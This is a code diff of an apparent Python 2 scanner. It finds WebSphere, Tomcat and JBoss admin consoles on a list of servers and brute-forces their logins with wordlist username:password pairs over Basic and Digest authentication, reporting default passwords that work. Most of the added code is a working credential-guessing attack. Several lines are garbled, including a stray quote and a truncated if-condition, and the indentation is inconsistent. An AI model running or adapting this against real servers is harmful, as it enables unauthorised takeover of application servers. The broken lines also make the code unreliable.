@@ -4,6 +4,8 @@ import sys
 import os
 import requests
 import time
+from requests.auth import HTTPBasicAuth
+from requests.auth import HTTPDigestAuth
 
 # colors class
 
@@ -38,10 +40,21 @@ banner()
 # path of the servers
 addresses = open("/home/el4zar/Desktop/servers", "r").read().split()
 
-# wordlist {
+# ----------------------------------wordlist --------------------{
 
 # websphere wordlist
 ws_wordlist = open("/home/el4zar/Desktop/wordlist", "r").read().split()
+
+# tomcat wordlist
+
+tc_wordlist = open("/home/el4zar/Desktop/wordlist", "r").read().split()
+
+# websphere wordlist
+jb_wordlist = open("/home/el4zar/Desktop/wordlist", "r").read().split()
+
+
+# ------------------------------------------------------------------ } 
+
 
 # user agent
 headers = {
@@ -64,9 +77,9 @@ queue4 = Queue.Queue()
 
 
 # application console paths
-paths = ['/console']
+paths = ['/console', '/manager/html', '/console/App.html'']
 
-print "[*] - Searching for servers with webshere"
+print "[*] - Searching for servers with webshere, tomcat and jboss"
 
 # websphere brute force class
 
@@ -103,22 +116,32 @@ class BruteForce_tc(threading.Thread):
         threading.Thread.__init__(self)
 
     def run(self):
-        print 'hi'
         while True:
-            # path = queue2.get() #wait for new path
-            # BRUTEFORCE
-            print path
+        	url = queue3.get()
+        	for word in tc_wordlist:
+        		first_word, second_word = word.split(':')
+        		r = requests.get(url, auth=HTTPBasicAuth(first_word, second_word))
+        		if r.status_code == 200:
+        			print "\r{}[* Tomcat *] - Default password on ip: {} : {}:{}{}".strip("\n").format(bgcolors.OKGREEN, url, first_word, second_word, bgcolors.ENDC)
 
-# jboss brute force class
+# jboss brute force class # note this is only suitable for jboss 7x and
+# above at the moment
 
 
 class BruteForce_jb(threading.Thread):
-
+	# requests.get(url, auth=HTTPDigestAuth('user', 'pass'))
     def __init__(self):
         threading.Thread.__init__(self)
 
     def run(self):
-        print 'hi'
+        while True:
+        	url = queue4.get()
+        	for word in jb_wordlist:
+        		first_word, second_word = word.split(':')
+        		r = requests.get(url, auth=HTTPDigestAuth(first_word, second_word))
+        		if r.status_code == 200:
+        			print "\r{}[* Jboss *] - Default password on ip: {} : {}:{}{}".strip("\n").format(bgcolors.OKGREEN, url, first_word, second_word, bgcolors.ENDC)
+
 
 # Search class
 
@@ -136,12 +159,18 @@ class WorkerThread(threading.Thread):
             for path in paths:
                 full = "http://{}{}".format(getdata, path)
                 try:
-                    r = a.get(full, timeout=2, headers=headers)
-                    # check which kind of service is running on the server: jboss, websphere or tomcat:
-                    # this check could be improved with more unique checks
-                    if '/console' in full:
-                        print "\r{}[!] - Found server with admin console at: {} - starting to bruteforce{}".strip("\n").format(bgcolors.OKBLUE, full, bgcolors.ENDC)
-                        queue2.put(full)
+					r = a.get(full, timeout=2, headers=headers)
+					# check which kind of service is running on the server: jboss, websphere or tomcat:
+					# this check could be improved with more unique checks
+					if 'console' in r.url and r.status_code == 200 and 'websphere' in r.text:
+						print "\r{}[!] - Found server with websphere admin console at: {} - starting to bruteforce{}".strip("\n").format(bgcolors.OKBLUE, full, bgcolors.ENDC)
+						queue2.put(full)
+					if r.status_code == 401 and '/manager/html' in r.url:
+						print "\r{}[!] - Found server with tomcat admin console at: {} - starting to bruteforce{}".strip("\n").format(bgcolors.OKBLUE, full, bgcolors.ENDC)
+						queue3.put(full)
+					if r.status_code == 401 and '/:
+						print "\r{}[!] - Found server with jboss admin console at: {} - starting to bruteforce{}".strip("\n").format(bgcolors.OKBLUE, full, bgcolors.ENDC)
+						queue4.put(full)
                 except:
                     continue
 
@@ -160,6 +189,14 @@ bf.start()
 bf1 = BruteForce_jb()
 bf1.start()
 
+# start threads at tomcat brute force class
+bf2 = BruteForce_tc()
+bf2.start()
+
+# start threads  at jboss brute force class
+bf3 = BruteForce_jb()
+bf3.start()
+
 for i in range(20):
     t = WorkerThread(queue)
     t.start()
@@ -173,5 +210,8 @@ for thread in threads:
 bf.stop()
 bf.join()
 
-# bf1.stop()
-# bf1.join()
+bf2.stop()
+bf2.join()
+
+bf3.stop()
+bf3.join()
